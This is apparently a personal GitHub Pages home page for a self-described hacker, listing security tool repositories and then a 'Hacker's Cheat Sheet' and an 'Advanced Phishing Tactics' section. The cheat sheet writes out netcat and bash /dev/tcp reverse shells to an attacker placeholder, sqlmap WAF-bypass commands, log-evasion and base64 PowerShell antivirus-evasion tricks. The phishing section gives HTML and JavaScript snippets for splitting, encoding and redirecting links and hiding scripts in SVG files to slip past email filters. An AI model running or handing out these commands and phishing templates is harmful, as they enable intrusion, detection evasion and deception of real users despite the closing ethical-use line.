---
layout: default
title: Home
---

# 🖥️ Welcome to WebPro's Hacker Space 🖥️

Welcome to the dark side of the internet, where we explore cybersecurity, vulnerabilities and even cutting-edge technology.

---

## 🚀 Latest Projects 🚀

Here are some of the cool projects I’ve been working on:

- 📡 [Exploitation-Module](https://github.com/webpro255/Exploitation-Module) – Automated tool for scanning, fetching, and logging exploit attempts.
- 🛠️ [HiddenSecTools](https://github.com/webpro255/HiddenSecTools) – A repository of hidden security tools.
- 🔍 [EventViewer-LogHunting](https://github.com/webpro255/EventViewer-LogHunting) – Hunt for security-relevant logs with Windows Event Viewer.
- 🛡️ [WordPress Forensics](https://github.com/webpro255/wordpress-forensics-tool) – Forensics tools specifically for WordPress investigations.
- 📊 [ELK-SOC-Tips](https://github.com/webpro255/ELK-SOC-Tips) – Tips and techniques for setting up an ELK stack in a SOC environment.
- 📡 [Network Traffic Visualization](https://github.com/webpro255/network-traffic-visualization) – Visualize network traffic in a clear and concise way.
- 🔧 [IT Support Scripts](https://github.com/webpro255/it-support-scripts) – A collection of useful scripts for IT support.
- 🔐 [IAM Policy Simulator](https://github.com/webpro255/iam-policy-simulator) – A project to simulate IAM policies for cloud security.
- 🔍 [Network Scanning Tools](https://github.com/webpro255/network-scanning-tools) – A collection of tools for network scanning and reconnaissance.
- 📈 [Network Anomaly Detection](https://github.com/webpro255/network-anomaly-detection) – Detect network anomalies using these tools and techniques.

---

## 👨‍💻 About Me 👨‍💻

I am WebPro, passionate about cybersecurity, ethical hacking and building tools. I love experimenting with new technologies, finding vulnerabilities and sharing my knowledge with the community.

---
## 🕵️ Cybersecurity Challenge 🕵️

Want to test your skills? Try to crack the password in my **[Password Cracker Game](./cyber-game.html)** and see how quickly you can break in!

## 🎮 Play another Game 🎮

Feeling like taking a break? Try your hand at the **[Guess the Number Game](./game.html)** and see if you can guess the correct number!

---
## 🧠 Hacker's Cheat Sheet 🧠

Only true hackers will appreciate these gems—cutting-edge tips and tricks that can elevate your penetration testing and ethical hacking skills. 

### 🔥 1. Command Line Kung Fu

- **List all open ports** (with process info) on Linux:
  ```bash
  sudo netstat -tuln -p
  ```
> Quickly see what's open on your system without needing fancy tools.

- Find all hidden files on a Linux machine:
  ```
  find / -name ".*" -type f
  ```
> Great for uncovering hidden configurations or malicious scripts.

- Fast directory scanning with FFUF:
  ```
  ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ -e .php,.html,.txt -o output.txt
  ```
> Quick and powerful fuzzing to discover hidden directories.

### 🚀 2. Hidden Gems in Wireshark

- Capture only HTTP GET requests:

```
http.request.method == "GET"
```
> Skip the noise and capture just the GET requests to hunt for interesting activity.

- Filter for suspicious DNS activity:
  ```
  dns.qry.name == "evil.com"
  ```
> Target specific DNS queries to detect if someone's reaching out to malicious domains.

### 🔒 3. Bypass Techniques

- **Bypass WAF using SQLMap with tamper scripts**:
    ```bash
    sqlmap -u "http://example.com/vuln.php?id=1" --tamper=space2comment --level=5 --risk=3
    ```
    > Get around pesky WAFs with a tamper script and crank up the aggression.

- **Custom User-Agent to fool detection systems**:
    ```bash
    curl -A "Googlebot/2.1 (+http://www.google.com/bot.html)" http://target.com
    ```
    > Impersonate a search engine crawler to bypass access restrictions.

### 🛡️ 4. Advanced Reverse Shells

- **Obfuscated Netcat reverse shell**:
    ```bash
    mkfifo /tmp/lolpipe; nc 0</tmp/lolpipe | /bin/sh >/tmp/lolpipe 2>&1; rm /tmp/lolpipe
    ```
    > Use named pipes to create stealthier reverse shells, harder to detect by basic monitoring.

- **Bash TCP reverse shell** (for when Netcat isn’t available):
    ```bash
    bash -i >& /dev/tcp/<attacker IP>/<port> 0>&1
    ```
    > Minimal footprint, effective on many Unix-based systems.

### 💻 5. Stealth Techniques

- **Avoid logging by executing commands in memory (Linux)**:
    ```bash
    exec /bin/bash 0</dev/null 2>/dev/null
    ```
    > Run commands in a way that avoids leaving traces in `/var/log` files.

- **Evade AV detection with PowerShell base64 encoding**:
    ```bash
    powershell.exe -EncodedCommand <Base64 Encoded Command>
    ```
    > Hide your PowerShell commands by encoding them in Base64, bypassing some AV detection.

### 🛠️ 6. Tools You Might Not Know (But Should)

- [**Obsidian**](https://obsidian.md/) – A tool for creating encrypted vaults of notes and penetration testing playbooks.
- [**Chaos Reader**](http://chaosreader.sourceforge.net/) – Parse, analyze, and extract files from packet capture (.pcap) files.
- [**LinEnum**](https://github.com/rebootuser/LinEnum) – A Linux enumeration script to quickly find privilege escalation vectors.

### 🎯 7. Fuzzing on Steroids

- **Fuzzing APIs with POST requests using FFUF**:
    ```bash
    ffuf -w wordlist.txt -X POST -d "parameter1=value&FUZZ=value" -u https://target.com/api/endpoint -o output.json
    ```
    > Quickly find API vulnerabilities by fuzzing POST request bodies.

- **Fuzzing JSON APIs with AFL (American Fuzzy Lop)**:
    ```bash
    afl-fuzz -i input/ -o output/ -- ./target_binary @@
    ```
    > Use AFL to find memory corruption issues in JSON parsers, or other binary targets.

💡 **Bonus Tip**: Always remember to document your findings in detail. Hacking without reporting is just half the work. 😉

---
## 🕵️ 8. Advanced Phishing Tactics 🕵️

Phishing has evolved into a complex craft, with attackers using sophisticated techniques to evade detection. Below are some **advanced, lesser-known phishing tactics** involving fragmentation and evasion, making it a unique addition to your hacker toolkit:

#### **1. Fragmented Links in Phishing Emails**
   - **Technique**: Split a malicious URL into multiple parts using HTML encoding or JavaScript fragments. This bypasses email filters that scan for specific malicious patterns.
   - **How**: Use JavaScript to reconstruct the URL upon user interaction.
   - **Example**:
     ```html
     <a href="http://safe-site.com/#frag1">Check this out</a>
     <!-- Later on the page -->
     <a href="frag2.com">More Info</a>
     <script>
       window.location.href = "http://safe-site.com/" + "frag2.com";
     </script>
     ```

#### **2. Multipart MIME Attachments**
   - **Technique**: Split a malicious payload across multiple MIME parts in an email attachment. Each part appears safe, but together they form a dangerous file.
   - **How**: Use `base64` encoding for parts and let the email client reassemble them.
   - **Example**:
     ```bash
     --==_MIME-Boundary
     Content-Type: application/octet-stream; name="part1"
     
     (base64-encoded malicious segment)
     --==_MIME-Boundary
     Content-Type: application/octet-stream; name="part2"
     
     (base64-encoded malicious segment)
     --==_MIME-Boundary--
     ```

#### **3. Obfuscated URLs Using HTML Encoding**
   - **Technique**: Encode URLs using HTML entities to obfuscate the destination. Multiple encoding layers make it hard for standard scanners to detect.
   - **How**: Use `%` encoding to hide URL parts.
   - **Example**:
     ```html
     <a href="http://%68%61%63%6B%65%72.com/%70%61%79%6C%6F%61%64">Click Here</a>
     ```

#### **4. Fragmented JavaScript Payloads**
   - **Technique**: Serve malicious JavaScript in fragments across different files, with each file appearing safe. The full attack is executed only when all fragments are loaded.
   - **How**: Use `<script>` tags to pull in pieces of malicious code.
   - **Example**:
     ```html
     <script src="legit-part1.js"></script>
     <script src="legit-part2.js"></script>
     <!-- Fully executes only if both parts are loaded -->
     ```

#### **5. Phishing Redirects with URL Fragments**
   - **Technique**: Utilize URL fragments (like `#`) to create dynamic redirects. Fragments are invisible to servers, making them harder to detect by security tools.
   - **How**: Use JavaScript to read and act on URL fragments.
   - **Example**:
     ```html
     <a href="https://trusted-site.com/#hidden-frag">Access Now</a>
     <script>
       if (window.location.hash === "#hidden-frag") {
         window.location.href = "http://malicious-site.com";
       }
     </script>
     ```

#### **6. Hidden Payloads in SVG Files**
   - **Technique**: Store phishing scripts inside SVG files, using SVG's ability to hold JavaScript for stealthy delivery.
   - **How**: Embed obfuscated JavaScript within the SVG `<script>` tag.
   - **Example**:
     ```html
     <svg>
       <script>
         var part1 = "alert('Gotcha! ";
         var part2 = "You’ve been phished!')";
         eval(part1 + part2);
       </script>
     </svg>
     ```

#### **7. Obfuscating Content with CSS**
   - **Technique**: Hide malicious links or content within CSS rules. The full phishing payload only becomes visible when rendered in the email client.
   - **How**: Use CSS `:after` pseudo-elements to construct links in parts.
   - **Example**:
     ```html
     <style>
       .hidden1:after { content: 'http://'; }
       .hidden2:after { content: 'phish-site.com'; }
     </style>
     <div class="hidden1"></div><div class="hidden2"></div>
     ```

### **Pro Tips**:
- Experiment with different encoding and fragmentation combinations to see which methods bypass specific email clients and security tools.

## 🤝 Connect with Me 🤝

Follow me on [GitHub](https://github.com/webpro255) for the latest updates, tools, and resources!
Always use such techniques in ethical, controlled environments to better understand and defend against sophisticated threats.
<img class="moving-mascot" src="https://github.githubassets.com/assets/mona-loading-default-c3c7aad1282f.gif" alt="Hacker Mascot" width="100" style="margin: 10px;">

<style>
    @keyframes moveAcross {
        from {
            right: -100px; /* Start off-screen on the right */
        }
        to {
            right: 100%; /* Move all the way to the left */
        }
    }

    .moving-mascot {
        position: absolute;
        top: 1800px; /* Adjust as needed */
        right: -100px; /* Start off the right side of the page */
        animation: moveAcross 20s linear infinite; /* Moves across the screen in 5 seconds */
    }
</style>

